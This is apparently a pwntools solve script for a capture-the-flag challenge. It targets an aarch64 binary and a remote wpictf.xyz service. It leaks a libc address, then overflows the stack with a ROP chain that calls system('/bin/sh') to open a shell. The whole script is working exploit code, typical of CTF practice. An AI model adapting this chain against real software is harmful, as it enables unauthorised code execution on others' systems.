#!/usr/bin/env python3
from pwn import *

exe = ELF("./arm")
binary = "./arm"
libc = ELF("./libc-2.23.so")
context.binary = exe
context.arch = "aarch64"
#context.log_level = "debug"
IP, PORT = "smash184384.wpictf.xyz", 15724

global io
gdbscript = '''
break main
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
else:
    io = process(["qemu-aarch64","-g","8133","arm"])

s = lambda a: io.send(a)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)

reu("printf at ")
libc.address = int(rl(), 16) - libc.symbols['printf']
log.info("libc -> "+hex(libc.address))
system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))
gadget1 = libc.address + 0x1ecbc
gadget2 = libc.address + 0x7e85c
    
payload = "a"*(0x88) + p64(gadget1) + "a"*0x10

payload += flat([
    gadget2, gadget2,
    binsh, binsh,
    system, system
])

sla("> ", payload)
    
io.interactive()